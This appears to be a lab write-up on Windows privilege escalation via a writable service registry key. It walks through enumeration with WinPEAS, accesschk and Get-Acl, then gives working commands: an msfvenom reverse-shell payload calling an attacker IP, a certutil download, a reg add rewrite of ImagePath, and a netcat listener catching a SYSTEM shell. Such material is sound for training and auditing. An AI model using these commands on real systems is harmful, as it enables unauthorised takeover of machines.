# LAB — Registry Attacks: Weak Registry Permissions

> [!summary] Quick Recall
> Service configurations (including `ImagePath`) are stored in Registry keys under `HKLM\SYSTEM\CurrentControlSet\Services\`. If a standard user has **write access to the Registry key** (not the file, but the key itself), they can change the `ImagePath` value to point to a reverse shell payload. When the service starts, it executes the payload under the service's account context (often `LocalSystem` → **NT AUTHORITY\SYSTEM**).

---

## Concept

- Service configuration is stored in the Registry: executable path (`ImagePath`), startup type, account context
- Attackers **modify the `ImagePath` value** in the Registry to redirect service execution to a custom payload
- This is different from replacing the binary on disk — here you change **where the Registry points**
- Vulnerable when `NT AUTHORITY\INTERACTIVE` has `KEY_ALL_ACCESS` on the service key

### Attack Flow

```
Run WinPEAS → Find service with writable Registry key →
Query service details (ImagePath, ObjectName) →
Verify permissions with accesschk/Get-Acl →
Modify ImagePath to point to reverse shell →
Start the service → Catch SYSTEM shell
```

---

## Enumeration

### Step 1: List All Services in Registry (Manual)

```cmd
reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services
```

> This returns hundreds of results — not practical to review manually.

### Step 2: Use WinPEAS to Find Writable Service Keys

Look for the section: **"Looking if you can modify any service registry"**

```bash
grep -aiA 5 "Looking if you can modify any service registry" windows.txt
```

| grep Option | Meaning                      |
| ----------- | ---------------------------- |
| `-a`        | Treat binary file as text    |
| `-i`        | Ignore case                  |
| `-A 5`      | Show 5 lines after the match |

**Example output:**

```
Looking if you can modify any service registry (T1574.011)
    HKLM\system\currentcontrolset\services\regsvc (Interactive [Allow: FullControl])
```

### Step 3: Query the Service Details

```cmd
reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\regsvc
```

**Output:**

```
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\regsvc
    Type          REG_DWORD      0x10
    Start         REG_DWORD      0x3
    ErrorControl  REG_DWORD      0x1
    ImagePath     REG_EXPAND_SZ  "C:\Program Files\Insecure Registry Service\insecureregistryservice.exe"
    DisplayName   REG_SZ         Insecure Registry Service
    ObjectName    REG_SZ         LocalSystem
```

> `ObjectName = LocalSystem` means the service runs as **NT AUTHORITY\SYSTEM** — highest privilege!

### Step 4: Verify Registry Key Permissions

**Method 1 — accesschk.exe:**

```cmd
C:\PrivEsc\accesschk.exe /accepteula -vk "HKLM\System\CurrentControlSet\services\regsvc"
```

> [!important]
> The `-k` switch is required when auditing **Registry keys** with `accesschk`. Without it you get "No matching objects found".

**Output:**

```
HKLM\System\CurrentControlSet\services\regsvc
  Medium Mandatory Level (Default) [No-Write-Up]
  RW NT AUTHORITY\SYSTEM
        KEY_ALL_ACCESS
  RW BUILTIN\Administrators
        KEY_ALL_ACCESS
  RW NT AUTHORITY\INTERACTIVE
        KEY_ALL_ACCESS
  R  Everyone
        KEY_QUERY_VALUE
        KEY_ENUMERATE_SUB_KEYS
        KEY_NOTIFY
        READ_CONTROL
```

> **`NT AUTHORITY\INTERACTIVE`** = all logged-in interactive users.
> **`KEY_ALL_ACCESS`** = full read, write, and modify access to the Registry key.
> ✅ Any logged-in standard user can modify the `ImagePath` value!

**Method 2 — PowerShell Get-Acl:**

```powershell
Get-Acl -Path HKLM:\SYSTEM\CurrentControlSet\services\regsvc | fl
```

**Output:**

```
Path   : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\regsvc
Owner  : BUILTIN\Administrators
Group  : NT AUTHORITY\SYSTEM
Access : Everyone Allow  ReadKey
         NT AUTHORITY\INTERACTIVE Allow  FullControl
         NT AUTHORITY\SYSTEM Allow  FullControl
         BUILTIN\Administrators Allow  FullControl
```

> Confirm: `NT AUTHORITY\INTERACTIVE Allow  FullControl` ✅

### Step 5: Check File Permissions (for comparison)

```cmd
icacls "C:\Program Files\Insecure Registry Service\insecureregistryservice.exe"
```

```
C:\Program Files\Insecure Registry Service\insecureregistryservice.exe
    NT AUTHORITY\SYSTEM:(I)(F)
    BUILTIN\Administrators:(I)(F)
    BUILTIN\Users:(I)(RX)
```

> Users only have Read & Execute on the file itself — can't replace the binary directly.
> **But** we can modify the Registry key to point to our own binary instead!

## Exploitation

### Step 6: Generate Reverse Shell Payload

On Kali (use [revshells.com](https://www.revshells.com/) → msfvenom → Windows Stageless Reverse TCP x64):

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI_IP> LPORT=4444 -f exe -o reverse.exe
```

### Step 7: Transfer Payload to Windows

```bash
# Kali — host payload
python3 -m http.server 8000
```

```cmd
:: Windows — download to C:\temp
cd C:\temp
certutil -f -urlcache http://<KALI_IP>:8000/reverse.exe reverse.exe
```

### Step 8: Modify ImagePath in Registry

```cmd
reg add HKLM\System\CurrentControlSet\services\regsvc /v ImagePath /d "C:\temp\reverse.exe" /f
```

> `/f` — force overwrite without confirmation prompt

**Verify the change:**

```cmd
reg query HKLM\System\CurrentControlSet\services\regsvc
```

```
    ImagePath    REG_SZ    C:\temp\reverse.exe
    ObjectName   REG_SZ    LocalSystem
```

> ✅ `ImagePath` now points to our payload. `ObjectName` is still `LocalSystem`.

### Step 9: Check Service Startup Type

```cmd
sc qc regsvc
```

```
SERVICE_NAME: regsvc
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\temp\reverse.exe
        DISPLAY_NAME       : Insecure Registry Service
        SERVICE_START_NAME : LocalSystem
```

> `START_TYPE = 3 (DEMAND_START)` → must be started manually.

### Step 10: Start Listener and Trigger the Service

```bash
# Kali — start listener
rlwrap -cAr nc -lvnp 4444
```

```cmd
:: Windows — start the service
sc start regsvc
```

### Step 11: Catch the SYSTEM Shell

```
listening on [any] 4444 ...
connect to [192.168.163.199] from (UNKNOWN) [10.49.185.167] 50013
Microsoft Windows [Version 10.0.17763.737]

C:\Windows\system32>whoami
nt authority\system
```

**Privilege escalation to NT AUTHORITY\SYSTEM achieved!**

## Key Takeaways

| Point | Detail |
| ----- | ------ |
| Registry location | `HKLM\SYSTEM\CurrentControlSet\Services\<ServiceName>` |
| Key value to modify | `ImagePath` (the executable path) |
| Permission to look for | `NT AUTHORITY\INTERACTIVE` → `KEY_ALL_ACCESS` or `FullControl` |
| Tools for enumeration | WinPEAS, `accesschk.exe -vk`, `Get-Acl`, `reg query` |
| Why this works | You can't overwrite the original binary (Read-only) but you **can** change where the Registry points |
| Service account | If `ObjectName = LocalSystem` → shell runs as **NT AUTHORITY\SYSTEM** |

> [!tip] Key Distinction
> **Autorun attack** = replace the binary file on disk (file permission issue)
> **Weak Registry attack** = change the `ImagePath` value in the Registry (Registry permission issue)
